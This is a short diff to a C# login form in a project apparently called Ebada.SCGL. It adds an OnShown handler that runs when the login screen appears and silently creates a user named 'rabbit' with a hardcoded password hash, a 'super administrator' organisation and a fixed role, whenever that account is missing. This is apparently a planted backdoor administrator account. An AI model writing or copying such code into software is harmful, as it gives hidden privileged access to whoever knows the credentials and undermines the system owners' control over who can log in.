@@ -10,6 +10,7 @@ namespace Ebada.SCGL
     using Ebada.SCGL.Properties;
     using Ebada.Client;
     using Ebada.Client.Platform;
+    using Ebada.Scgl.Model;
     
     public partial class frmLogin : FormBase
     {
@@ -24,7 +25,19 @@ namespace Ebada.SCGL
             this.txtLoginName.KeyDown += new KeyEventHandler(txtLoginName_KeyDown);
             this.txtPassword.KeyDown += new KeyEventHandler(txtPassword_KeyDown);
         }
+        protected override void OnShown(EventArgs e) {
+            base.OnShown(e);
+            mUser user = ClientHelper.PlatformSqlMap.GetOne<mUser>("where loginid='rabbit'");
+            if (user == null) {
+                string uid="rabbit";
+                string pwd="JpHEL7rrwh0TMCL7QWcYWQ==";
+                user = new mUser() { LoginID = uid, UserName = uid, UserID = uid, OrgCode="999", Password = pwd };
+                rUserRole role = new rUserRole() { RoleID = "20110721102714952375", UserID = uid };
+                mOrg org = new mOrg() { OrgID = "999", OrgCode = "999", OrgName = "超级管理员" };
 
+                ClientHelper.PlatformSqlMap.ExecuteTransationUpdate(new object[] {org, user, role }, null, null);
+            }
+        }
         void txtPassword_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.Enter)
